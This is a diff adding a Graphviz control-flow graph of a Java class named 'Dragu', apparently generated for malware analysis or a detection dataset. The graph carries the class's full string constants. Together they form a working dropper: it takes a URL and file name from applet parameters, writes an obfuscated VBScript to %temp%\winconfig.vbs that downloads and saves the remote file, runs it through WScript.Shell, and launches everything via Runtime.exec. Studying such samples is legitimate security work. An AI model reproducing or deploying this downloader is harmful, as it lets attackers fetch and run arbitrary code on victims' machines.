@@ -1,0 +1,66 @@
+digraph "" {
+    "r0 := @this: Dragu"
+    "load.r r0"
+    "r0 := @this: Dragu"->"load.r r0";
+    "push \"URL\""
+    "load.r r0"->"push \"URL\"";
+    "virtualinvoke <Dragu: java.lang.String getParameter(java.lang.String)>"
+    "push \"URL\""->"virtualinvoke <Dragu: java.lang.String getParameter(java.lang.String)>";
+    "store.r r1"
+    "virtualinvoke <Dragu: java.lang.String getParameter(java.lang.String)>"->"store.r r1";
+    "store.r r1"->"load.r r0";
+    "push \"FileName\""
+    "load.r r0"->"push \"FileName\"";
+    "push \"FileName\""->"virtualinvoke <Dragu: java.lang.String getParameter(java.lang.String)>";
+    "store.r r0"
+    "virtualinvoke <Dragu: java.lang.String getParameter(java.lang.String)>"->"store.r r0";
+    "new java.lang.StringBuilder"
+    "store.r r0"->"new java.lang.StringBuilder";
+    "dup1.r"
+    "new java.lang.StringBuilder"->"dup1.r";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "push \"cmd.exe /c echo Dim Sl > %temp%\\winconfig.vbs & echo Dim im >> %temp%\\winconfig.vbs & echo Dim S >> %temp%\\winconfig.vbs & echo Dim H >> %temp%\\winconfig.vbs & echo DIM A >> %temp%\\winconfig.vbs & echo Dim D >> %temp%\\winconfig.vbs & echo Dim Y >> %temp%\\winconfig.vbs & echo Y = \\\"MSXML2\\\" >> %temp%\\winconfig.vbs & echo H = \\\".XMLHTTP\\\" >> %temp%\\winconfig.vbs & echo D = \\\"ADO\\\" >> %temp%\\winconfig.vbs & echo S = \\\"DB\\\" >> %temp%\\winconfig.vbs & echo A = \\\".Stream\\\" >> %temp%\\winconfig.vbs & echo Sl = \\\"WScript\\\" >> %temp%\\winconfig.vbs & echo im = \\\".Shell\\\" >> %temp%\\winconfig.vbs & echo strFileURL = \\\"\""
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"push \"cmd.exe /c echo Dim Sl > %temp%\\winconfig.vbs & echo Dim im >> %temp%\\winconfig.vbs & echo Dim S >> %temp%\\winconfig.vbs & echo Dim H >> %temp%\\winconfig.vbs & echo DIM A >> %temp%\\winconfig.vbs & echo Dim D >> %temp%\\winconfig.vbs & echo Dim Y >> %temp%\\winconfig.vbs & echo Y = \\\"MSXML2\\\" >> %temp%\\winconfig.vbs & echo H = \\\".XMLHTTP\\\" >> %temp%\\winconfig.vbs & echo D = \\\"ADO\\\" >> %temp%\\winconfig.vbs & echo S = \\\"DB\\\" >> %temp%\\winconfig.vbs & echo A = \\\".Stream\\\" >> %temp%\\winconfig.vbs & echo Sl = \\\"WScript\\\" >> %temp%\\winconfig.vbs & echo im = \\\".Shell\\\" >> %temp%\\winconfig.vbs & echo strFileURL = \\\"\"";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
+    "push \"cmd.exe /c echo Dim Sl > %temp%\\winconfig.vbs & echo Dim im >> %temp%\\winconfig.vbs & echo Dim S >> %temp%\\winconfig.vbs & echo Dim H >> %temp%\\winconfig.vbs & echo DIM A >> %temp%\\winconfig.vbs & echo Dim D >> %temp%\\winconfig.vbs & echo Dim Y >> %temp%\\winconfig.vbs & echo Y = \\\"MSXML2\\\" >> %temp%\\winconfig.vbs & echo H = \\\".XMLHTTP\\\" >> %temp%\\winconfig.vbs & echo D = \\\"ADO\\\" >> %temp%\\winconfig.vbs & echo S = \\\"DB\\\" >> %temp%\\winconfig.vbs & echo A = \\\".Stream\\\" >> %temp%\\winconfig.vbs & echo Sl = \\\"WScript\\\" >> %temp%\\winconfig.vbs & echo im = \\\".Shell\\\" >> %temp%\\winconfig.vbs & echo strFileURL = \\\"\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "load.r r1"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r1";
+    "load.r r1"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"\\\" >> %temp%\\winconfig.vbs & echo strHDLocation = \\\"\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"\\\" >> %temp%\\winconfig.vbs & echo strHDLocation = \\\"\"";
+    "push \"\\\" >> %temp%\\winconfig.vbs & echo strHDLocation = \\\"\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r0";
+    "load.r r0"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"\\\" >> %temp%\\winconfig.vbs & echo Set objXMLHTTP = CreateObject(Y+H) >> %temp%\\winconfig.vbs & echo objXMLHTTP.open \\\"GET\\\", strFileURL, false >> %temp%\\winconfig.vbs & echo objXMLHTTP.send() >> %temp%\\winconfig.vbs & echo If objXMLHTTP.Status = 200 Then >> %temp%\\winconfig.vbs & echo Set objADOStream = CreateObject(D+S+A) >> %temp%\\winconfig.vbs & echo objADOStream.Open >> %temp%\\winconfig.vbs & echo objADOStream.Type = 1 >> %temp%\\winconfig.vbs & echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\\winconfig.vbs & echo objADOStream.Position = 0 >> %temp%\\winconfig.vbs & echo Set objFSO = Createobject(\\\"Scripting.FileSystemObject\\\") >> %temp%\\winconfig.vbs & echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> %temp%\\winconfig.vbs & echo Set objFSO = Nothing >> %temp%\\winconfig.vbs & echo objADOStream.SaveToFile strHDLocation >> %temp%\\winconfig.vbs & echo objADOStream.Close >> %temp%\\winconfig.vbs & echo Set objADOStream = Nothing >> %temp%\\winconfig.vbs & echo End if >> %temp%\\winconfig.vbs & echo Set objXMLHTTP = Nothing >> %temp%\\winconfig.vbs & echo Set shell = CreateObject(Sl+im) >> %temp%\\winconfig.vbs & echo shell.Run \\\"\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"\\\" >> %temp%\\winconfig.vbs & echo Set objXMLHTTP = CreateObject(Y+H) >> %temp%\\winconfig.vbs & echo objXMLHTTP.open \\\"GET\\\", strFileURL, false >> %temp%\\winconfig.vbs & echo objXMLHTTP.send() >> %temp%\\winconfig.vbs & echo If objXMLHTTP.Status = 200 Then >> %temp%\\winconfig.vbs & echo Set objADOStream = CreateObject(D+S+A) >> %temp%\\winconfig.vbs & echo objADOStream.Open >> %temp%\\winconfig.vbs & echo objADOStream.Type = 1 >> %temp%\\winconfig.vbs & echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\\winconfig.vbs & echo objADOStream.Position = 0 >> %temp%\\winconfig.vbs & echo Set objFSO = Createobject(\\\"Scripting.FileSystemObject\\\") >> %temp%\\winconfig.vbs & echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> %temp%\\winconfig.vbs & echo Set objFSO = Nothing >> %temp%\\winconfig.vbs & echo objADOStream.SaveToFile strHDLocation >> %temp%\\winconfig.vbs & echo objADOStream.Close >> %temp%\\winconfig.vbs & echo Set objADOStream = Nothing >> %temp%\\winconfig.vbs & echo End if >> %temp%\\winconfig.vbs & echo Set objXMLHTTP = Nothing >> %temp%\\winconfig.vbs & echo Set shell = CreateObject(Sl+im) >> %temp%\\winconfig.vbs & echo shell.Run \\\"\"";
+    "push \"\\\" >> %temp%\\winconfig.vbs & echo Set objXMLHTTP = CreateObject(Y+H) >> %temp%\\winconfig.vbs & echo objXMLHTTP.open \\\"GET\\\", strFileURL, false >> %temp%\\winconfig.vbs & echo objXMLHTTP.send() >> %temp%\\winconfig.vbs & echo If objXMLHTTP.Status = 200 Then >> %temp%\\winconfig.vbs & echo Set objADOStream = CreateObject(D+S+A) >> %temp%\\winconfig.vbs & echo objADOStream.Open >> %temp%\\winconfig.vbs & echo objADOStream.Type = 1 >> %temp%\\winconfig.vbs & echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\\winconfig.vbs & echo objADOStream.Position = 0 >> %temp%\\winconfig.vbs & echo Set objFSO = Createobject(\\\"Scripting.FileSystemObject\\\") >> %temp%\\winconfig.vbs & echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> %temp%\\winconfig.vbs & echo Set objFSO = Nothing >> %temp%\\winconfig.vbs & echo objADOStream.SaveToFile strHDLocation >> %temp%\\winconfig.vbs & echo objADOStream.Close >> %temp%\\winconfig.vbs & echo Set objADOStream = Nothing >> %temp%\\winconfig.vbs & echo End if >> %temp%\\winconfig.vbs & echo Set objXMLHTTP = Nothing >> %temp%\\winconfig.vbs & echo Set shell = CreateObject(Sl+im) >> %temp%\\winconfig.vbs & echo shell.Run \\\"\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r0";
+    "load.r r0"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"\\\" >> %temp%\\winconfig.vbs & start %temp%\\winconfig.vbs\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"\\\" >> %temp%\\winconfig.vbs & start %temp%\\winconfig.vbs\"";
+    "push \"\\\" >> %temp%\\winconfig.vbs & start %temp%\\winconfig.vbs\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"store.r r0";
+    "push \"os.name\""
+    "store.r r0"->"push \"os.name\"";
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"
+    "push \"os.name\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "virtualinvoke <java.lang.String: java.lang.String toLowerCase()>"
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"virtualinvoke <java.lang.String: java.lang.String toLowerCase()>";
+    "pop"
+    "virtualinvoke <java.lang.String: java.lang.String toLowerCase()>"->"pop";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"
+    "pop"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"load.r r0";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"
+    "load.r r0"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
+    "goto return"
+    "pop"->"goto return";
+    "return"
+    "goto return"->"return";
+    "virtualinvoke <java.io.IOException: void printStackTrace()>"
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"virtualinvoke <java.io.IOException: void printStackTrace()>";
+}
